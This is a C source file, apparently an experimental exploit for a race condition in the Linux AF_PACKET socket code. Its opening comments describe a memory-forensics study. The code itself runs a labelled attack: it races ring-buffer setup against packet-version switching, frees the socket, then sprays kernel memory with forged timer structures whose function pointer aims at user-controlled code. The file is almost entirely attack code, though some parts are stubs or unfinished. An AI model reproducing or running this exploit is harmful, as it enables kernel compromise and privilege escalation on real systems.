//The goal here is to create af packets.
//This should create struct packet_socket obkects allocated by the SLUB allocator.
//I will then dump the memory on the emulator using lime and try to find these sockets.
//I can then compare the size with that of what I determined from my kernel module to print the sizes and output.
//(y)
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sched.h>
#include <sys/utsname.h>
#include <pthread.h>
#define BUFLEN 776
#define DATALEN 8192
#define NUM_THREADS 200
#define THREAD_COUNT 100
#define LIB_OFFSET (void*)0x50000000
#define FUNC_OFFSET 0x31c

int allfds[THREAD_COUNT];

volatile int* check;
volatile int barrier = 1;
volatile int vers_switcher_done = 0;

#define TIMER_OFFSET 488
struct timer_list {
        int next;
        int prev;
        //struct list_head           entry;                /*     0     8 */
        long unsigned int          expires;              /*     8     4 */
        int base;//struct tvec_base *         base;                 /*    12     4 */
        void                       (*function)(long unsigned int); /*    16     4 */
        long unsigned int          data;                 /*    20     4 */
        int                        slack;                /*    24     4 */

        /* size: 28, cachelines: 1, members: 6 */
        /* last cacheline: 28 bytes */
};

#define PAD 64
//int  ad_fds[PAD];

#define CONF_RING_FRAMES 1


typedef union  { void* ptr; long* lptr; long l; } helper;
struct tpacket_req3 tp;
int sfd;
int mapped = 0;
helper h;
void* func;

void func2(long data) {
    //(*h.lptr) = 1;
    return;
}

void pad_kmalloc(void)
{
    int x;

    for(x=0; x<PAD; x++)
        if(socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)) == -1) {
            fprintf(stderr,"pad_kmalloc() socket error\n");
            exit(1);
        }

}

void release_lib(void* data, int len);

int load_lib(void* ptroff) {
    typedef void (*_func_ptr)(long arg);
    void *handle = dlopen("libmytestlib.so",RTLD_LAZY);
    int fd;
    void* data;
    struct stat s;
    fd = open("libmytestlib.so", O_RDWR);
    if (fstat(fd, &s) < 0) {
        perror("asdf");
        exit(-1);
    }

    data = mmap(ptroff, s.st_size, PROT_READ | PROT_EXEC, MAP_SHARED, fd, 0);
    if (data != ptroff) {
        perror("can't load lib at required address!");
        exit(-1);
    }

    h.ptr = mmap(NULL, sizeof(long), PROT_READ | PROT_EXEC | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (!h.ptr) {
        printf("%s\n",strerror(errno));
        fflush(stdout);
        perror("global bad");
        exit(-1);
    }
    printf("can mmap?\n");
    fflush(stdout);
    *(h.lptr) = 0;
    printf("GLOBAL IS SET %d, %p %x\n", (*h.lptr), h.ptr, h.l);
    fflush(stdout);

    if (handle) {
        _func_ptr _func = dlsym(handle, "libfun");
        printf("%p\n" , (void*)_func);
        unsigned long* other =(void*)((char*)data+FUNC_OFFSET); 
        _func_ptr _lol = (void*)((char*)data+FUNC_OFFSET); 
        func = (void*)((char*)data+FUNC_OFFSET); 
        //printf("--> %p %p\n", data, other);
        //unsigned long val1 = *((unsigned long*)_func);
        //unsigned long val2 = *(other);
        //printf("--> %x %x\n", val1, val2);
        //if(_func) {
        //    _func(h.l);
        //    printf("Asdf2\n");
        //} else { printf("Bad Fuc PTr\n"); }
        //if(_lol) {
        //    _lol(h.l);
        //  printf("Asdf\n");
        //} else { printf("Bad Fuc LOL PTr\n"); }
        
    } else { printf("Bad Handle\n"); }
    fflush(stdout);

    release_lib(LIB_OFFSET,s.st_size); //allow kernel to go here now?
    return s.st_size;
}

void release_lib(void* data, int len) {
    if (data) {
        munmap(data, len);
    }
}

void func3(long data);
int main(int argc, char** argv);

void* lock_ctlbuf(void* threadid) {
    long tid = (long)threadid;
    char buf2[100];
    int rc,i;
    struct sockaddr_in server;
    char message[1000] , server_reply[2000];
    union {
        char   control[CMSG_SPACE(BUFLEN)];
        struct cmsghdr cmh;
        struct {
            char padding[TIMER_OFFSET];
            struct timer_list timer;
        };
        struct {
            char padding[TIMER_OFFSET+sizeof(struct timer_list)+2];
            char funcspace[CMSG_SPACE(BUFLEN)-TIMER_OFFSET+sizeof(struct timer_list)+2];
        };
                        /* Space large enough to hold a ucred structure */

    } control_un;
    int diff = ((const void*)&main - (const void*)&func3);
    memcpy(control_un.funcspace, (const void*)&lolrofl, diff);
    struct cmsghdr *cmhp;
    struct msghdr msgh;
    struct iovec iov;
    char data[DATALEN];
     
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons( 5000 );
 
    //Connect to remote server
    if (connect(allfds[tid] , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        perror("connect failed. Error");
    }
     
    //printf("Send Msg Test\n");
    memset(&control_un, 0x00, sizeof(control_un));
    memset(&control_un, 0x42, sizeof(control_un));
    control_un.cmh.cmsg_len = CMSG_LEN(BUFLEN);
    control_un.cmh.cmsg_level = SOL_SOCKET;
    control_un.cmh.cmsg_type = SCM_RIGHTS;
    control_un.timer.next = 0;
    control_un.timer.prev = 0;
    control_un.timer.expires = 4294943360u;
    control_un.timer.base = 0;
    //control_un.timer.function = func; //(void *)0xc025ddf0;
    control_un.timer.function = (void*)func2; //(void *)0xc025ddf0;
    control_un.timer.data = h.l;
    //control_un.timer.flags = 1;
    control_un.timer.slack = -1;


    //memset(&control_un, 'A', sizeof(control_un));
    //control_un.cmh.cmsg_len = CMSG_LEN(BUFLEN);
    //control_un.cmh.cmsg_level = SOL_SOCKET;
    //control_un.cmh.cmsg_type = SCM_RIGHTS;

    msgh.msg_name = NULL;
    msgh.msg_namelen = 0;

    msgh.msg_control = control_un.control;
    msgh.msg_controllen = sizeof(control_un.control);

    msgh.msg_iov = &iov;
    msgh.msg_iovlen = 1;
    iov.iov_base = &data;
    iov.iov_len = sizeof(data);
    memset(&data, 0x41, sizeof(data));

    ////printf("Res: %d %s", res, strerror(errno));
    for ( i = 0; i < 600; ++i) {

        int res = sendmsg(allfds[tid], &msgh,0);
        if( res < 0)  {
                perror("sendmsg");
        }
        //printf("Sent Message %d\n",i);
    }
    pthread_exit(NULL);
}


// Attack Part I 
// Call PACKET_RX_RING option once to set a timer.
void *setsockopt_thread(void *arg)
{
    while(barrier) {
    }
    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &tp, sizeof(tp));

    return NULL;
}

// Attack Part II
// Race Part I and try to flip the Version from 1 to 3 
void *vers_switcher(void *arg)
{
    int val,x,y;

    while(barrier) {}

    while(1) {
        val = TPACKET_V1;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        y++;

        if(x != 0) break;

        val = TPACKET_V3;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        if(x != 0) break;

        y++;
    }
    if (x < 0) {
        printf("%s\n",strerror(errno));
        fflush(stdout);
        //vers_switcher_done = 1;
        //return NULL;
    }

    fprintf(stderr,"version switcher stopping, x = %d (y = %d, last val = %d)\n",x,y,val);
    vers_switcher_done = 1;


    return NULL;
}

void func3(long data) {
    int k = 0;
    k++;
    return;
}

int main(int argc, char** argv) 
{
    printf("asdfasdf");
    fflush(stdout);
    int threadCount = 100;
    int k = 0;
    int fd;
    int val;
    int off;
    // load lib
    int len = load_lib(LIB_OFFSET);
    printf("Function loaded at %p\n", func);
    fflush(stdout);

    for (k = 0; k < THREAD_COUNT; ++k) {
        fd = socket(AF_INET , SOCK_STREAM , 0);
        if (fd == -1)
        {
            printf("Could not create socket");
            fflush(stdout);
        }
        //puts("Socket created");
        int sendbuff = 2;
        if (setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sendbuff, sizeof(sendbuff)) < 0) {
            perror("Setting sock buff size");
        }
        allfds[k] = fd;
    }

    //int threadCount = atoi(argv[1]);
    pthread_t setsockopt_thread_thread,a;
    struct tpacket_block_desc *pbd;
    socklen_t l;

    check = (int*)malloc(sizeof(int));
    if (!check) {
        perror("failed to malloc check\n");
        exit(1);
    } 
    *check = 0;
    printf("asdfasdf");
    fflush(stdout);

    pad_kmalloc();

    fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));

    if (fd==-1) {
        perror("target socket error\n");
        exit(1);
    }
    // want to create 
    struct stat tgtStat;
    if (fstat(fd,&tgtStat) < 0) {
        perror("fstat");
    } else {
        printf("target socket inode: %d\n", (unsigned int)tgtStat.st_ino);
        fflush(stdout);
    }

    fprintf(stderr,"sockets allocated\n");

    printf("Start Attack..\n");
    fflush(stdout);

    val = TPACKET_V3;

    


    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
    tp.tp_block_nr = 1;
    tp.tp_frame_size = getpagesize();
    tp.tp_frame_nr = CONF_RING_FRAMES;

//try to set the timeout to 10 seconds
//the default timeout might still be used though depending on when the race was won
    tp.tp_retire_blk_tov = 10000;
    while(1) {
        fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));

        if (fd==-1) {
            perror("target socket error\n");
            exit(1);
        }

        int res = setsockopt(fd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));
        if  (res < 0) {
            printf("%s\n",strerror(errno));
            fflush(stdout);
            return 1;
        }

        sfd = fd;

        barrier = 1;
        vers_switcher_done = 0;

        if(pthread_create(&setsockopt_thread_thread, NULL, setsockopt_thread, (void *)NULL)) {
            fprintf(stderr, "Error creating thread\n");
            return 1;
        }


        pthread_create(&a, NULL, vers_switcher, (void *)NULL);

        usleep(200000);

        fprintf(stderr,"removing barrier and !spraying..\n");

        barrier = 0;
        //start threads and alloc ctl buf's in slabs
        usleep(100000);

        while(!vers_switcher_done)usleep(100000);

        l = sizeof(val);
        getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, &l);

        fprintf(stderr,"current packet version = %d\n",val);

        pbd = mmap(0, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0);


        if(pbd == MAP_FAILED) {
            fprintf(stderr,"could not map pbd\n");
            exit(1);
        }

        else {
            off = pbd->hdr.bh1.offset_to_first_pkt;
            fprintf(stderr,"pbd->hdr.bh1.offset_to_first_pkt = %d\n",off);
        }

        pad_kmalloc();
        //munmap for free to work :S
        munmap(pbd, tp.tp_block_size * tp.tp_block_nr);

        // did we win?
        if(val == TPACKET_V1 && off != 0) {
            fprintf(stderr,"*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*\n");
            break; //yeh we did bro
        } else {
            fprintf(stderr, "you suck");
        }
        close(sfd);
        sleep(12);
    }
    int res2 = close(sfd); // close attack socket, and now try to spray into that location
    if (res2 < 0) {
        printf("%s %d\n",strerror(errno),res2);
        fflush(stdout);
    } else {
        printf("closed sfd\n");
        fflush(stdout);
    }
    printf("Local func pointer %p\n",(void*)func2);
    fflush(stdout);

    pthread_t dummy;
    long rc,t;
    for (t = 0; t < threadCount; t++) {
        rc = pthread_create(&dummy, NULL, lock_ctlbuf, (void*)t);
        if (rc) {
            perror("pthread_create()");
            exit(1);
        }
    }

    
    k = 0;
    for (k=0; k<20; ++k) {
        sleep(1);
        printf("%d\n",*check);
        fflush(stdout);
    }

    if(check) {
        printf("freeeing check\n");
        fflush(stdout);
        free((void*)check);
    }
    if(len) {
        printf("freeing func lib\n");
        fflush(stdout);
        release_lib(LIB_OFFSET,len);
    }

    printf("GLOBAL IS GET %d\n", *(h.lptr));
    //pthread_exit(NULL);
    return 0;

    return 0;
}
